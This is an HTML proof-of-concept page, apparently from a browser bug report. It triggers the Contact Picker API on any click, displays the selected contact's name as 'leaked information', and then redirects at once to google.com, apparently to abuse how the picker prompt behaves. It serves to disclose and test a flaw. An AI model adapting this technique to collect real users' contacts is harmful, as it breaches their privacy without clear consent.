<!DOCTYPE html>
<html lang="en">
<head>
    <title>PoC</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

    <script>
        onclick = async () => {
            (async () => {
                let contacts = await navigator.contacts.select(["name"], {});
                document.write(`
                    <h1>
                        <font color="red">Leaked information:</font> ${contacts[0]["name"]}
                    </h1>
                `);

                // Replace open() with meta refresh
                let meta = document.createElement("meta");
                meta.httpEquiv = "refresh";
                meta.content = "0;url=https://www.google.com";
                document.head.appendChild(meta);
            })();
        }
    </script>
</head>
<body>
</body>
</html>
